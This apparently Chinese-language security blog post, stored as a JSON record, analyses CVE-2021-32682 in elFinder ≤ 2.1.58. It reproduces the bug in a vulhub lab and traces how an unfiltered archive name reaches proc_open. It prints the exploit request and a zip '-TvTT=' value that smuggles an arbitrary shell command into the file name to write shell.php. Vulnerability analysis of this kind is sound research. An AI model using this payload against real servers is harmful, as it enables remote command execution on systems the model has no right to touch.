{"title":"elfinder rce","uid":"7ea883b6d4c638116488ccef6e5f43a4","slug":"elfinder-rce","date":"2022-03-25T15:45:38.000Z","updated":"2022-03-29T13:21:30.887Z","comments":true,"path":"api/articles/elfinder-rce.json","keywords":null,"cover":"https://w.wallhaven.cc/full/rd/wallhaven-rdyyjm.png","content":"<h1 id=\"CVE-2021-32682-elFinder-≤-2-1-58-RCE-分析\"><a href=\"#CVE-2021-32682-elFinder-≤-2-1-58-RCE-分析\" class=\"headerlink\" title=\"[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析\"></a>[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析</h1><h3 id=\"0x00漏洞点简介\"><a href=\"#0x00漏洞点简介\" class=\"headerlink\" title=\"0x00漏洞点简介\"></a><strong>0x00漏洞点简介</strong></h3><p>elfinder 是一款开源的web文件管理器，能够对文件进行操作，漏洞点在于zip压缩存档时没有对传入的name参数进行过滤，导致使用了linux 中 zip 命令参数进行命令执行。</p>\n<h3 id=\"0x01环境搭建\"><a href=\"#0x01环境搭建\" class=\"headerlink\" title=\"0x01环境搭建\"></a><strong>0x01环境搭建</strong></h3><p>环境搭建直接使用p神的vulhub 直接进行搭建：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">git</span> clone https://github.com/vulhub/vulhub.git\n\n<span class=\"token builtin class-name\">cd</span> 到镜像目标文件所在地\n\n<span class=\"token function\">sudo</span> <span class=\"token function\">docker-compose</span> up -d\n\n环境启动成功/注意开启的端口/然后就可以进行复现了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://s2.loli.net/2022/03/28/b4JS2jYKmZWHFXy.png\" alt=\"Untitled\"></p>\n<p>访问服务映射的端口：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/NobqpJnsmQSEygX.png\" alt=\"Untitled\"></p>\n<p>找到归档功能点（图中鼠标所在位置）：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/4CUkdSyM8qI6WfL.png\" alt=\"Untitled\"></p>\n<p>紧接着按照p神文档写的漏洞点进行复现：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/P1nlWEAHeG6pyzv.png\" alt=\"Untitled\"></p>\n<p><img src=\"https://s2.loli.net/2022/03/28/6YrhzdumiKCwTZS.png\" alt=\"Untitled\"></p>\n<p>要注意两点：</p>\n<p>1、要在压缩了1之后进行发包，后面target的值必须是两个文件的hash</p>\n<p>2、腾讯云发包应该是被拦截了。这里我又在本地搭建的</p>\n<p>这个触发点还挺有意思的，之后会继续看一下其他利用方式。这里也是利用name参数过滤不足利用了zip -TT 参数实现cmd命令执行的。</p>\n<h3 id=\"0x02漏洞跟踪分析\"><a href=\"#0x02漏洞跟踪分析\" class=\"headerlink\" title=\"0x02漏洞跟踪分析\"></a><strong>0x02漏洞跟踪分析</strong></h3><p>漏洞源码：<a href=\"https://github.com/Studio-42/elFinder/releases/tag/2.1.58\">https://github.com/Studio-42/elFinder/releases/tag/2.1.58</a></p>\n<p>分析工具：Phpstorm</p>\n<p>根据之前漏洞复现捕获pcap数据包进行分析：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;php&#x2F;connector.minimal.php?cmd&#x3D;archive&amp;name&#x3D;-TvTT&#x3D;id%3Eshell.php%20%23%20a.zip&amp;target&#x3D;l1_Lw&amp;targets%5B1%5D&#x3D;l1_Mi56aXA&amp;targets%5B0%5D&#x3D;l1_MS50eHQ&amp;type&#x3D;application%2Fzip HTTP&#x2F;1.1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36\nAccept-Encoding: gzip, deflate\nAccept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01\nConnection: close\nHost: 43.128.18.191\nX-Requested-With: XMLHttpRequest\nReferer: http:&#x2F;&#x2F;43.128.18.191:8080&#x2F;\nAccept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>请求头中connector.minimal.php，get请求了cmd参数为archive，在源码中追踪一下此文件，搜索cmd未果。</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/TrRn8q4pPFgIUi5.png\" alt=\"Untitled\"></p>\n<p>看一下是否存在include 或者 require 其他php文件：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/iDwIql5rJt2VBGp.png\" alt=\"Untitled\"></p>\n<p>存在一个包含文件 autoload.php，内部全是包含调用的文件，并不能准确定位漏洞点，此时要么去猜测漏洞点文件位置，要么根据传入参数名称进行全局搜索确认，最后找到archive 自定义函数</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/zMQPVeAkJm9Flg3.png\" alt=\"Untitled\"></p>\n<p>经过全局搜索寻找（偷偷看师傅们的漏洞分析），找到了archive 函数点：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/yCl19HFuAEidMLW.png\" alt=\"Untitled\"></p>\n<p>函数中调用了makeArchivers 自定义函数，进行跟进函数：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/ftahi39XIdoDTOe.png\" alt=\"Untitled\"></p>\n<p>函数代码如下所示：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">makeArchive</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arc</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$arc</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'phpfunction'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_callable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arc</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arc</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$cwd</span> <span class=\"token operator\">=</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$files</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">DIRECTORY_SEPARATOR</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'escapeshellarg'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arc</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$arc</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'argc'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' '</span> <span class=\"token operator\">.</span> <span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' '</span> <span class=\"token operator\">.</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$err_out</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">procExec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$o</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$err_out</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dir</span> <span class=\"token operator\">.</span> <span class=\"token constant\">DIRECTORY_SEPARATOR</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$path</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析发现这个函数就是我们传参进来并且进行执行的函数，内部首先对传入的name进行了字符串的处理，之后使procExec进行了执行，这里我们跟进一下<strong>procExec</strong>这个自己构造的函数，内部构造：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/LoyEVl8SUw2Jdv4.png\" alt=\"Untitled\"></p>\n<p>函数内部存在proc_open 系统函数：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/EhbmUQnu2zto6I3.png\" alt=\"Untitled\"></p>\n<p>这里proc_open 函数就是要利用的漏洞点，那我们返回来找一下最终name参数传参的一个过程，我们已知最终利用的就是procExec()，但是name并不是直接传入方法中，我们可以依据方法的调用来看一下最终是怎么进行传参，这是一个大致的函数调用流程，我们接下来从最终调用开始展开分析:</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/DH7jIzWbnkOU5tp.png\" alt=\"Untitled\"></p>\n<p>首先来看elFinder.archive() 这个方法，这个方法对传入参数的name进行的存在判断，然后：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/mligb15EQSHZs8J.png\" alt=\"Untitled\"></p>\n<p>接下来进入archive这个方法进行跟踪，这个方法代码跟多，我只截图name处理部分，有兴趣的可以自己跟踪分析：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/eo7xOa49pzQ51b3.png\" alt=\"Untitled\"></p>\n<pre><code>这里进行name字符串处理，可以看到进行了初步的字符替换然后进行拼接，最终使用uniqueName()这个函数进行了处理，我们继续跟进一下这个函数来分析这个字符串：\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/03/28/naWxo6BQHFDrOzv.png\" alt=\"Untitled\"></p>\n<p>处理完之后进入了remoteArchive()方法中：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/XVUxvi4SAygo2MB.png\" alt=\"Untitled\"></p>\n<p>接着进入makeArchive()方法中进行处理：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/2Z3oAslmiC1yMW4.png\" alt=\"Untitled\"></p>\n<p>处理完成由procExec()方法进行执行，这里procExec()中调用了proc_open()这个php默认方法进行执行：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/qx3cmIJVG6vSBP1.png\" alt=\"Untitled\"></p>\n<p>字符串最终经过以下几个方法最终到达procExec()，通过proc_open() 来进行cmd 指令的操作，</p>\n<p><a href=\"https://whimsical.com/elfinder-poc-66xtTeo9wqUnNTmxEHuk3D@2Ux7TurymNRMFc1UUtu5\">https:&#x2F;&#x2F;whimsical.com&#x2F;elfinder-poc-66xtTeo9wqUnNTmxEHuk3D@2Ux7TurymNRMFc1UUtu5</a></p>\n<p>这里我们看一下proc_open()方法的具体的作用：</p>\n<p><a href=\"https://www.php.net/manual/zh/function.proc-open\">https://www.php.net/manual/zh/function.proc-open</a></p>\n<p><img src=\"https://s2.loli.net/2022/03/28/d7fF2q1ScoJkh6i.png\" alt=\"Untitled\"></p>\n<p>经过修改源码运行处理，可以获取其传入name &#x3D; 1.zip 在proc_open() 执行之前字符串为</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token string\">\"zip -r9 -q '1.zip' './a.zip'\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里我们可以利用一下linux 中的zip 命令，zip命令详解如下：</p>\n<p><img src=\"https://s2.loli.net/2022/03/28/ZaPXhlwStH895Le.png\" alt=\"Untitled\"></p>\n<p>也就是说我们可以控制传入的name值来实现任意命令的执行，这里我们使用zip -TT 的参数来实现任意命令执行，我们可以构造：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token string\">\"zip -r9 -q '-TvTT=\"</span><span class=\"token variable\"><span class=\"token variable\">$(</span>id<span class=\"token operator\">></span>shell.php<span class=\"token variable\">)</span></span><span class=\"token string\">\".zip' './a.txt'\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以将等号之后的内容换成你想执行的命令。</p>\n<h3 id=\"0x03参考链接\"><a href=\"#0x03参考链接\" class=\"headerlink\" title=\"0x03参考链接\"></a><strong>0x03参考链接</strong></h3><p><a href=\"https://xz.aliyun.com/t/10739#toc-5\">https://xz.aliyun.com/t/10739#toc-5</a></p>\n<p><a href=\"https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682\">https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682</a></p>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/language/php/phar.html\">https://websec.readthedocs.io/zh/latest/language/php/phar.html</a></p>\n","text":"[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析0x00漏洞点简介elfinder 是一款开源的web文件管理器，能够对文件进行操作，漏洞点在于zip压缩存档时没有对传入的name参数进行过滤，导致使用了linux 中 zip 命令参数进行命令执...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/tags/漏洞复现.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2021-32682-elFinder-%E2%89%A4-2-1-58-RCE-%E5%88%86%E6%9E%90\"><span class=\"toc-text\">[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00%E6%BC%8F%E6%B4%9E%E7%82%B9%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">0x00漏洞点简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">0x01环境搭建</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x02漏洞跟踪分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">0x03参考链接</span></a></li></ol></li></ol></li></ol>","author":{"name":"神林","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一名面向github挖洞的安全研究员","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"php 代码审计","uid":"7e3aab8248542e317877e2ea637498f0","slug":"php-代码审计","date":"2022-03-27T15:39:39.000Z","updated":"2022-03-29T13:21:08.863Z","comments":true,"path":"api/articles/php-代码审计.json","keywords":null,"cover":"https://w.wallhaven.cc/full/j3/wallhaven-j3dg1m.jpg","text":" 详述php代码审计这件事常见cms框架： thinkphp yii 2.0 laravel php代码审计： 1、cms的代码审计 2、ctf题目中实战利用 3、针对一些开源代码审计 手段： 1、代码审计工具 2、代码审计点 3、特殊函数以及魔法函数 利用： 1、xss点 2、...","link":"","photos":[],"count_time":{"symbolsCount":497,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"代码审计","slug":"代码审计","count":1,"path":"api/tags/代码审计.json"}],"author":{"name":"神林","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一名面向github挖洞的安全研究员","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{}}